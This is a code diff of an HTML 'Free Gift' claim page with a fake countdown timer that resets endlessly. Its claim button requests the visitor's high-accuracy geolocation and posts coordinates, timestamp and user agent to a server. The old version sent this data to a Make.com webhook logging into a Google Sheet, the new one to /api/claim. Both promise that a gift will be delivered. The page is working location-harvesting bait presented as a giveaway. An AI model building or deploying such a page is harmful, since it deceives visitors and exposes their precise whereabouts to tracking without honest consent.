@@ -231,11 +231,9 @@
         <div class="product-image">
           <img
             id="productImg"
-            src=""
+            src="https://img.kwcdn.com/product/fancy/e7a6af48-67c3-45ee-9d67-9aff2eda4aaa.jpg?imageView2/2/w/800/q/70/format/avif"
             alt="Gift Product"
-            style="display: none"
           />
-          <span class="placeholder-text" id="placeholder"></span>
         </div>
 
         <h2 class="product-name">Exclusive Mystery Gift Box</h2>
@@ -266,11 +264,7 @@
 
         <div id="statusMsg" class="status-message"></div>
 
-        <button
-          class="claim-button pulse"
-          id="claimBtn"
-          onclick="requestLocation()"
-        >
+        <button class="claim-button pulse" id="claimBtn">
           🎉 Click To Get Free Gift
         </button>
 
@@ -282,52 +276,24 @@
     </div>
 
     <script>
-      // Timer countdown
-      let timeLeft = 86385; // 23:59:45 in seconds
-
-      function updateTimer() {
-        const hours = Math.floor(timeLeft / 3600);
-        const minutes = Math.floor((timeLeft % 3600) / 60);
-        const seconds = timeLeft % 60;
-
-        document.getElementById("timer").textContent = `${hours
+      // Timer
+      let timeLeft = 86385;
+      setInterval(() => {
+        const h = Math.floor(timeLeft / 3600);
+        const m = Math.floor((timeLeft % 3600) / 60);
+        const s = timeLeft % 60;
+        document.getElementById("timer").textContent = `${h
           .toString()
-          .padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds
+          .padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s
           .toString()
           .padStart(2, "0")}`;
+        if (timeLeft > 0) timeLeft--;
+        else timeLeft = 86385;
+      }, 1000);
 
-        if (timeLeft > 0) {
-          timeLeft--;
-        } else {
-          timeLeft = 86385; // Reset
-        }
-      }
-
-      setInterval(updateTimer, 1000);
-
-      // Image handling
-      const img = document.getElementById("productImg");
-      const placeholder = document.getElementById("placeholder");
-
-      // Replace 'YOUR_IMAGE_URL_HERE' with your actual image URL
-      img.src =
-        "https://img.kwcdn.com/product/fancy/e7a6af48-67c3-45ee-9d67-9aff2eda4aaa.jpg?imageView2/2/w/800/q/70/format/avif";
-
-      img.onload = function () {
-        if (
-          img.src &&
-          img.src !== window.location.href &&
-          img.src !==
-            "https://img.kwcdn.com/product/fancy/e7a6af48-67c3-45ee-9d67-9aff2eda4aaa.jpg?imageView2/2/w/800/q/70/format/avif"
-        ) {
-          img.style.display = "block";
-          placeholder.style.display = "none";
-        }
-      };
-
-      // Location request function
-      function requestLocation() {
-        const btn = document.getElementById("claimBtn");
+      // Claim button
+      document.getElementById("claimBtn").onclick = function () {
+        const btn = this;
         const statusMsg = document.getElementById("statusMsg");
 
         btn.disabled = true;
@@ -335,77 +301,60 @@
         statusMsg.style.display = "none";
 
         if (!navigator.geolocation) {
-          showStatus(
-            "error",
-            "❌ Geolocation is not supported by your browser"
-          );
+          statusMsg.textContent = "❌ Geolocation not supported!";
           btn.disabled = false;
           btn.textContent = "🎉 Click To Get Free Gift";
           return;
         }
 
         navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const locationData = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
+          async (pos) => {
+            const data = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
               timestamp: new Date().toISOString(),
               userAgent: navigator.userAgent,
             };
 
-            // send to Google Sheet through Make.com webhook
-            fetch(
-              "https://hook.eu1.make.com/thq4gv3ebk9duln991vh6qfx59x8ldek",
-              {
+            try {
+              const res = await fetch("/api/claim", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(locationData),
+                body: JSON.stringify(data),
+              });
+
+              if (res.ok) {
+                statusMsg.className = "status-message success";
+                statusMsg.textContent =
+                  "✅ Gift claimed! Check your email soon.";
+              } else {
+                statusMsg.className = "status-message error";
+                statusMsg.textContent = "❌ Error sending data!";
               }
-            );
-
-            showStatus(
-              "success",
-              "✅ Success! Your free gift will be delivered soon."
-            );
-          },
-
-          // Error callback
-          function (error) {
-            let errorMsg = "";
-            switch (error.code) {
-              case error.PERMISSION_DENIED:
-                errorMsg =
-                  "❌ Location permission denied. Please allow location access to claim your gift.";
-                break;
-              case error.POSITION_UNAVAILABLE:
-                errorMsg = "❌ Location information unavailable.";
-                break;
-              case error.TIMEOUT:
-                errorMsg = "❌ Location request timed out.";
-                break;
-              default:
-                errorMsg = "❌ An error occurred while getting your location.";
+            } catch (err) {
+              statusMsg.className = "status-message error";
+              statusMsg.textContent = "❌ Network error!";
             }
-            showStatus("error", errorMsg);
+
+            statusMsg.style.display = "block";
             btn.disabled = false;
             btn.textContent = "🎉 Click To Get Free Gift";
           },
-          // Options
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
+          (err) => {
+            let msg = "❌ An error occurred!";
+            if (err.code === 1) msg = "❌ Location permission denied!";
+            else if (err.code === 2) msg = "❌ Location unavailable!";
+            else if (err.code === 3) msg = "❌ Location request timed out!";
+            statusMsg.className = "status-message error";
+            statusMsg.textContent = msg;
+            statusMsg.style.display = "block";
+            btn.disabled = false;
+            btn.textContent = "🎉 Click To Get Free Gift";
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-      }
-
-      function showStatus(type, message) {
-        const statusMsg = document.getElementById("statusMsg");
-        statusMsg.className = `status-message ${type}`;
-        statusMsg.textContent = message;
-        statusMsg.style.display = "block";
-      }
+      };
     </script>
   </body>
 </html>
